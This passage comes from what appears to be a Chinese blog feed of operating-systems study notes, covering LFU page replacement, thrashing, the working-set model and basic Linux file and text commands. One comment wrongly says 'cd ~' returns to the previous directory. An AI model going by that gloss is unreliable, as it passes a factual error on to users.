class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>LFU（Least Frequently Used）算法</strong></em></p><p>根据数据的历史访问频率来淘汰数据，其核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。LFU的每个数据块都有一个引用计数，所有数据块按照引用计数排序，具有相同引用计数的数据块则按照时间排序。</p></li></ul><h4 id="抖动"><a href="#抖动" class="headerlink" title="抖动"></a>抖动</h4><p><strong>内存抖动：非常频繁的换页活动；</strong></p><p><strong>系统中的“颠簸”是由缺页率高引起的，与内存容量、交换信息量无直接关系。</strong></p><p>在页面置换过程中的一种最糟糕的情形是，刚刚换出的页面马上又要换入主存，刚刚换入的页面马上就要换出主存，这种**<u>频繁的页面调度行为</u>称为抖动，或颠簸<strong>。</strong>如果一个进程在换页上用的时间多于执行时间，那么这个进程就在颠簸**。频繁的发生缺页中断，其主要原因是某个进程频繁访问的页面数目高于可用的物理页帧数目。虚拟内存技术可以在内存中保留更多的进程以提高系统效率。但系统必须很“聪明”地管理页面分配方案。在稳定状态，几乎主存的所有空间都被进程块占据，处理机和操作系统可以直接访问到尽可能多的进程。但如果管理不当，处理机的大部分时间都将用于交换块，即请求调入页面的操作，而不是执行进程的指令，这就会大大降低系统效率。</p><h4 id="工作集"><a href="#工作集" class="headerlink" title="工作集"></a>工作集</h4><p>工作集(或驻留集)是指<strong>在某段时间间隔内，进程要访问的页面集合</strong>。经常被使用的页面需要在工作集中，而长期不被使用的页面要从工作集中被丢弃。为了防止系统出现抖动现象，需要选择合适的工作集大小。</p><p>工作集模型的原理是：<u>让操作系统跟踪每个进程的工作集，并为进程分配大于其工作集的物理块。</u>如果还有空闲物理块，则可以再调一个 进程到内存以增加多道程序数。如果所有工作集之和增加以至于超过了可用物理块的总数，那么操作系统会暂停一个进程， 将其页面调出并且将其物理块分配给其他进程，防止出现抖动现象。</p><p>正确选择:工作集的大小，对存储器的利用率和系统吞吐量的提高，都将产生重要影响。</p><h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><h3 id="目录和文件的相关操作"><a href="#目录和文件的相关操作" class="headerlink" title="目录和文件的相关操作"></a>目录和文件的相关操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home      # 变换工作目录</span><br><span class="line">cd .          # 代表当前目录</span><br><span class="line">cd ..         # 代表上一层目录</span><br><span class="line">cd ~          # 代表前一个工作目录</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd           # 输出当前工作目录 </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test   # 新建单层目录</span><br><span class="line">mkdir -p /test/testing   # 新建多层目录</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rmdir         # 只能用来删除空目录</span><br><span class="line">rm -r test    # 删除目录时需要使用&quot;-r&quot;选项，删除非空目录</span><br><span class="line">rm aaa        # 默认仅删除文件</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ./aaa /tmp/bbb  # 将当前目录下的aaa文件复制到tmp下并更名为bbb</span><br><span class="line">cp -r /etc /tmp    # 复制目录时需要使用&quot;-r&quot;选项，如复制/etc/目录下的所有内容到/tmp下</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /home/test /home/test2  # 移动或更名现有的文件或目录</span><br></pre></td></tr></table></figure><h3 id="文本文件内容查看"><a href="#文本文件内容查看" class="headerlink" title="文本文件内容查看"></a>文本文件内容查看</h3><p><strong>cat</strong>：由第一行开始查看文件。cat 是Concatenate (连续)的简写，主要的功能是将-一个文件的内容连续输出在屏幕上。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./aaa</span><br></pre></td></tr></table></figure><p><strong>tac</strong>：从最后一行开始显示，可以看出cat与tac是倒置的。cat 是由第一行到最后一行连续显示在屏幕上，而tac则是由最后一行到第一行反向在屏幕上显示出来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac ./aaa</span><br></pre></td></tr></table></figure><p><strong>nl</strong>：显示文件内容的时候，一起显示文件行号。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl ./aaa</span><br></pre></td></tr></table></figure><p><strong>more、less</strong>：一页一页显示文件内容。前面提到的nl、cat、 tac等，都是一次性将数据显示到屏幕上面，若是文件行数很多，前面的内容就会看不到，这时就需要使用more与less来一页一页查看文件内容。命令如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more ./aaa   # 向后翻页</span><br><span class="line">less ./aaa   # 向前翻页</span><br></pre></td></tr></table></figure><p><strong>head</strong>：head命令查看文本文件时，只显示头几行。用法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n number 文件名   # 只显示文件的前number行</span><br></pre></td></tr></table></figure><p>-n选项后面的参数number如果是负数，代表列出前面的所有行数，但不包括后面number行。如&#x2F;etc&#x2F;man.config 共有141行，则<code>head -n -100 /etc/man. config</code>就会列出前面41行，后面100行不会打印出来了。</p><p><strong>tail</strong>：tail命令查看文本文件时，只显示尾几行。用法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -n number 文件名</span><br></pre></td></tr></table></figure><p>当number前面有“+”号时，与head -n -xx有异曲同工之妙。如<code>tail -n +100 /etc/man.config</code>代表该文件从100行以后都会被列出来，同样，在man.config共有141行，因此第100~141行就会被列出来，前面的99行都不会被显示出来。</p><p><strong>touch</strong>：建立一个空文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch aaa</span><br></pre></td></tr></table></figure><p><strong>grep</strong>：分析一行信息，若当中有需要的信息，就将该行显示出来。常用在管道中。例如将文件aaa中包含”root”的行的内容显示出来的命令为<code>cat aaa | grep &quot;root&quot;</code>或者<code>grep &quot;root&quot; aaa</code>。当使用<code>grep -E</code>表示后面跟着的是延申型正则表达式，等价于”egrep”。比如找到文件try_ grep含有以a字母为行开头的内容，可以使用<code>grep -E ^a try_grep</code>。^M表示以M开头的行，M$表示以M结尾的行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat aaa | grep &quot;root&quot;  # 文件aaa中包含&quot;root&quot;的行的内容</span><br><span class="line">grep &quot;root&quot; aaa        # 与上一行作用相同</span><br><span class="line">grep -E ^a try_grep    # </span><br></pre></td></tr></table></figure><h3 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h3><p><strong>df</strong>：列出文件系统的整体磁盘使用量。</p><p><strong>ps</strong>：将某个时间点的程序运行情况显示出来。</p><p><strong>top</strong>：动态观察程序变化，持续侦测程序运行状态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;操作系统&quot;&gt;&lt;a href=&quot;#操作系统&quot; class=&quot;headerlink&quot; title=&quot;操作系统&quot;&gt;&lt;/a&gt;操作系统&lt;/h1&gt;&lt;h2 id=&quot;进程管理&quot;&gt;&lt;a href=&quot;#进程管理&quot; class=&quot;headerlink&quot; title=&quot;进程管理&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
